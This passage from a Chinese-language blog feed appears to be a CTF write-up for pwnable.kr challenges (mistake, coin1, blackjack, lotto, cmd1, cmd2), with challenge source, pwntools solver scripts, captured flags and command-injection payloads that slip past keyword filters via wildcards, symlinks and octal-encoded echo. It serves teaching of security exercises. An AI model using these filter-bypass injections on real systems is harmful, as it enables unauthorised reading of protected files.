class="line">0x00008d2c &lt;+12&gt;:movr0, r3</span><br></pre></td></tr></table></figure><p><code>ｌｒ</code> 是连接寄存器 <em>(Link Register)</em> 当程序通过<code>BL</code>或<code>BLX</code>指令调用子程序时，<code>R14</code>被设置成该子程序的返回地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00008d7c &lt;+64&gt;:    bl  0x8d20 &lt;key3&gt;</span><br><span class="line">0x00008d80 &lt;+68&gt;:    mov r3, r012</span><br></pre></td></tr></table></figure><p><code>main（）</code>调用<code>key3()</code>时，<code>ｋｅｙ3()</code>的返回地址是它的下一条指令的地址 即 <code>lr = 0x8d80</code><br>最终 <code>r0 = lr = 0x8d80</code></p><p>so r2 = 108400</p><h3 id="mistake"><a href="#mistake" class="headerlink" title="mistake"></a>mistake</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">xor</span><span class="params">(<span class="keyword">char</span>* s, <span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">s[i] ^= XORKEY;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">if</span>(fd=open(<span class="string">"/home/mistake/password"</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"can't open password %d\n"</span>, fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"do not bruteforce...\n"</span>);</span><br><span class="line">sleep(time(<span class="number">0</span>)%<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="keyword">int</span> len;</span><br><span class="line"><span class="keyword">if</span>(!(len=read(fd,pw_buf,PW_LEN) &gt; <span class="number">0</span>))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"read error\n"</span>);</span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> pw_buf2[PW_LEN+<span class="number">1</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"input password : "</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%10s"</span>, pw_buf2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// xor your input</span></span><br><span class="line">xor(pw_buf2, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strncmp</span>(pw_buf, pw_buf2, PW_LEN))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Password OK\n"</span>);</span><br><span class="line">system(<span class="string">"/bin/cat flag\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Wrong Password\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">close(fd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>if(fd=open(&quot;/home/mistake/password&quot;,O_RDONLY,0400) &lt; 0)</code>这里是问题所在，&lt;优先级比=高，所以先执行&lt;</p><p>但是返回值肯定&gt;0,所以这里fd = 0</p><p>所以只要判断用户的第二个输入和1异或后等于第一个就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mistake@ubuntu:~$ ./mistake </span><br><span class="line">do not bruteforce...</span><br><span class="line">0000000000</span><br><span class="line">input password : 1111111111</span><br><span class="line">Password OK</span><br><span class="line">Mommy, the operator priority always confuses me :(</span><br></pre></td></tr></table></figure><p>###Shellshock*</p><p>emmm这个我也不太清楚原理，网上找找 CVE-2014-6271 </p><h3 id="coin1"><a href="#coin1" class="headerlink" title="coin1"></a>coin1</h3><p>emmm经过试玩，，，这就是个编程题，二分法，remote好像太慢了，只能在服务器上编写，还不会vim</p><p>借用大佬代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line">__author__ = <span class="string">"TaQini"</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getNC</span><span class="params">()</span>:</span></span><br><span class="line">r = target.readline() <span class="comment">#number and changes</span></span><br><span class="line">NC = re.findall(<span class="string">"[0-9]+"</span>,r)</span><br><span class="line"><span class="keyword">return</span> int(NC[<span class="number">0</span>]), int(NC[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">guess</span><span class="params">(start, end)</span>:</span></span><br><span class="line">    coin = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(start, end+<span class="number">1</span>):</span><br><span class="line">        coin += str(i) + <span class="string">" "</span></span><br><span class="line">    <span class="comment"># print "coin " + coin</span></span><br><span class="line">    target.sendline(coin)</span><br><span class="line">    weight = target.read()</span><br><span class="line">    <span class="comment"># print "weight " + str(weight)</span></span><br><span class="line">    <span class="keyword">return</span> weight</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">binsearch</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">N, C = getNC()</span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="comment"># print "N= " + str(N) + " C=" + str(C)</span></span><br><span class="line">Left = <span class="number">0</span></span><br><span class="line">Right = N - <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (Left &lt;= Right):</span><br><span class="line">Mid = (Left + Right)/<span class="number">2</span></span><br><span class="line"><span class="comment"># print "guess " + str(Left) + "-" + str(Mid)</span></span><br><span class="line">cnt += <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> cnt &gt; C:</span><br><span class="line"><span class="comment"># print "Hit!"</span></span><br><span class="line">weight = guess(Left,Mid)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">weight = guess(Left,Mid)</span><br><span class="line"><span class="comment"># print "trial= " + str(cnt)</span></span><br><span class="line"><span class="comment"># print "and C= " + str(C)</span></span><br><span class="line"><span class="keyword">if</span> (eval(weight) + <span class="number">1</span>) % <span class="number">10</span>:  <span class="comment"># fake coin not here</span></span><br><span class="line">Left = Mid + <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">Right = Mid</span><br><span class="line"><span class="keyword">print</span> <span class="string">"hit!"</span>,(i),</span><br><span class="line"> </span><br><span class="line">target = remote(<span class="string">"127.0.0.1"</span>,<span class="number">9007</span>)</span><br><span class="line">target.read() <span class="comment">#rule of game</span></span><br><span class="line">binsearch()</span><br><span class="line"><span class="keyword">print</span> target.read()</span><br></pre></td></tr></table></figure><h3 id="blackjack"><a href="#blackjack" class="headerlink" title="blackjack"></a>blackjack</h3><p>hiahiahia 真好玩，建议先玩几遍再看代码，代码超级长，，，</p><p>总之最后发现bet没有限制正负，所以只要给-1000000的值 然后再输就行了</p><h3 id="lotto"><a href="#lotto" class="headerlink" title="lotto"></a>lotto</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> r;</span><br><span class="line">r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line"><span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// generate lotto numbers</span></span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd==<span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line">lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;<span class="comment">// 1 ~ 45</span></span><br><span class="line">&#125;</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(lotto[i] == submit[j])&#123;</span><br><span class="line">match++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// win!</span></span><br><span class="line"><span class="keyword">if</span>(match == <span class="number">6</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">// menu</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span>(menu)&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">play();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">help();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>emmm两个for循环 可以取巧</p><p>我们只要输入相同的6个，只要lotto的六个值有且只有一个匹配上了就行，可以手动慢慢玩也可以写脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *  </span><br><span class="line">target = process(<span class="string">"./lotto"</span>)  </span><br><span class="line"></span><br><span class="line">flag = <span class="number">2</span>  </span><br><span class="line"><span class="keyword">while</span> flag:  </span><br><span class="line">    s = target.readuntil(<span class="string">"Exit\n"</span>)  </span><br><span class="line">    <span class="keyword">if</span> <span class="string">"bad"</span> <span class="keyword">not</span> <span class="keyword">in</span> s:  </span><br><span class="line">        <span class="keyword">print</span> s  </span><br><span class="line">        flag -= <span class="number">1</span>  </span><br><span class="line">    target.sendline(<span class="string">"1"</span>)  </span><br><span class="line">    k = target.read()  </span><br><span class="line">    target.sendline(chr(<span class="number">43</span>)*<span class="number">6</span>)</span><br></pre></td></tr></table></figure><p>done!</p><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下strstr函数的定义，知道不能出现上诉的几个词</p><p>分开就好</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 &quot;/bin/cat &apos;f&apos;&apos;l&apos;&apos;a&apos;&apos;g&apos;&quot;</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure><p>或者 过滤了flag 但是没有通配符 所以简单暴力的直接cat f* 就行了 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd1@ubuntu:~$ ./cmd1 &quot;/bin/cat f*&quot;</span><br><span class="line">mommy now I get what PATH environment is for :)</span><br></pre></td></tr></table></figure><h3 id="cmd2"><a href="#cmd2" class="headerlink" title="cmd2"></a>cmd2</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">return</span> r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span>** p;</span><br><span class="line"><span class="keyword">for</span>(p=environ; *p; p++)<span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>&#123;</span><br><span class="line">delete_env();</span><br><span class="line">putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line"><span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">system( argv[<span class="number">1</span>] );</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>好像有很多方法(・∀・(・∀・(・∀・*)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd2@ubuntu:~$ ./cmd2 &quot;command -p cat f*&quot;</span><br><span class="line">command -p cat f*</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure><p>有个很好玩的骚套路</p><p>发现pwd命令可以直接产生/字符，因此可以构造出如下的使用方法。首先在/tmp目录下建立自己的目录exploit，然后创建目录/tmp/exploit/c。那么，如果在/tmp/exploit/c目录下执行pwd命令就可以得到/tmp/exploit/c了。然后在/tmp/exploit下构造cat的软应用ln -s /bin/cat cat，在/tmp/exploit/c下建立flag的软引用ln -s /home/cmd2/flag flag。然后在/tmp/exploit/c下执行命令/home/cmd2/cmd2 “\$(pwd)at f*”就可以得到flag了。其原理就是利用“$(pwd)at”构造出/tmp/exploit/cat命令。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ln -s /bin/cat cat</span><br><span class="line">$ mkdir c</span><br><span class="line">$ cd c</span><br><span class="line">$ ln -s /home/cmd2/flag flag</span><br><span class="line">$ /home/cmd2/cmd2 &quot;\$(pwd)at f*&quot;</span><br><span class="line">$(pwd)at f*</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure><p>还有这个</p><p>（echo 命令不通过参数 e 也可以解析出 16 进制 和 8 进制的字串，不过不同 echo 版本会对这个功能有所限制，像笔者虚拟机 Ubuntu 16.04 的 echo 就无法解析，只有 echo -e 才能解析特殊字符） </p><p>经过测试服务器上 echo 只能直接解析出 8 进制字符串： </p> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cmd2@ubuntu:/tmp/c$ /home/cmd2/cmd2 &quot;\$(echo &apos;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&apos;)&quot;</span><br><span class="line">$(echo &apos;\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147&apos;)</span><br><span class="line">FuN_w1th_5h3ll_v4riabl3s_haha</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;#pwnable&lt;br&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="http://yoursite.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Gdb</title>
    <link href="http://yoursite.com/2019/04/01/gdb/"/>
    <id>http://yoursite.com/2019/04/01/gdb/</id>
    <published>2019-03-31T16:00:00.000Z</published>
    <updated>2019-04-01T13:56:45.530Z</updated>
    
